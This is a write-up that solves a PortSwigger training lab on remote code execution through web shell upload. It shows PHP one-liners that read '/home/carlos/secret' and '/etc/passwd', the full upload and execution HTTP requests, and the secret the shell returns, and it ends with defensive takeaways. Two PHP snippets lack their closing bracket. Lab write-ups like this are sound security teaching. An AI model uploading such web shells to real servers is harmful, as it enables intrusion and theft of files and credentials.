# File Upload Remote Code Execution via Web Shell Upload

## Lab Overview
This writeup explains how to solve the PortSwigger lab titled *"File upload remote code execution via web shell upload"*. The objective is to exploit a file upload function to execute a malicious PHP script and retrieve a secret from Carlos's account.

---

## Steps to Solve the Lab

### Step 1: Identify the File Upload Functionality
1. **Log in to your account** and navigate to the avatar upload section.
2. Use the avatar upload function to upload an arbitrary image (e.g., `test.jpg`).
3. Verify that the image was successfully uploaded by checking its preview on the account page.

### Step 2: Inspect the File Upload Request
1. In **Burp Suite**, go to **Proxy > HTTP history**.
2. Apply a filter for `Images` under **Filter by MIME type** to locate the relevant request.
3. Identify the GET request for fetching the uploaded image, which uses the following structure:
   ```http
   GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
   ```
4. Send this request to **Burp Repeater** for further testing.

### Step 3: Create a Malicious PHP File
1. On your local machine, create a file named `exploit.php` with the following content:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?
   ```
   This script will retrieve the contents of Carlos's secret file.

   ```php
   <?php echo file_get_contents('/etc/passwd'); ?
   ```
   This script will retrieve the contents of Servers'login details. in this case we do not need this 
### Step 4: Upload the Malicious PHP File
1. In **Burp Suite**, intercept the POST request for uploading the avatar.
2. Modify the request to upload the `exploit.php` file instead of an image. The modified request will look like this:
   ```http
   POST /my-account/avatar HTTP/2
   Host: 0ad6001704a8d480b489133000cd0090.web-security-academy.net
   Cookie: session=<your cookie lol😁>
   Content-Length: 467
   Cache-Control: max-age=0
   Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Accept-Language: en-US,en;q=0.9
   Origin: https://0ad6001704a8d480b489133000cd0090.web-security-academy.net
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHObQBmYr68402ITq
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Referer: https://0ad6001704a8d480b489133000cd0090.web-security-academy.net/my-account?id=wiener
   Accept-Encoding: gzip, deflate, br
   Priority: u=0, i

   ------WebKitFormBoundaryHObQBmYr68402ITq
   Content-Disposition: form-data; name="avatar"; filename="my-exploit.php"
   Content-Type: image/jpeg

   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ------WebKitFormBoundaryHObQBmYr68402ITq
   Content-Disposition: form-data; name="user"

   wiener
   ------WebKitFormBoundaryHObQBmYr68402ITq
   Content-Disposition: form-data; name="csrf"

   FhAafgxyWJjckx5adFtOil4f5Z4L7TG8
   ------WebKitFormBoundaryHObQBmYr68402ITq--
   ```
3. Forward the request. The server response should confirm successful upload:
   ```http
   HTTP/2 200 OK
   The file avatars/my-exploit.php has been uploaded.
   ```

### Step 5: Execute the Malicious Script
1. In **Burp Repeater**, modify the GET request to point to the uploaded PHP file:
   ```http
   GET /files/avatars/my-exploit.php HTTP/2
   Host: 0ad6001704a8d480b489133000cd0090.web-security-academy.net
   Cookie: session=<your cookie lol😁>
   Sec-Ch-Ua-Platform: "Windows"
   Accept-Language: en-US,en;q=0.9
   Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
   Sec-Ch-Ua-Mobile: ?0
   Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: no-cors
   Sec-Fetch-Dest: image
   Referer: https://0ad6001704a8d480b489133000cd0090.web-security-academy.net/my-account
   Accept-Encoding: gzip, deflate, br
   Priority: u=2, i
   ```
2. Send the request. The server executes the script and returns Carlos's secret:
   ```
   y0ctBNN6AZ6Jhn5AGT5XcdbatfYpNkfF
   ```

### Step 6: Submit the Secret
1. Copy the secret from the response.
2. Submit it in the lab's solution box to complete the challenge.

---

## Key Takeaways
1. Always validate and sanitize file uploads to prevent execution of malicious code.
2. Use MIME type checks and file extensions to restrict allowed uploads.
3. Implement server-side validation to avoid arbitrary code execution.

---
![File Upload Remote Code Execution via Web Shell Upload Lab1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab1a.png) 

![File Upload Remote Code Execution via Web Shell Upload Lab1](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab1b.png) 
## References
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-upload)

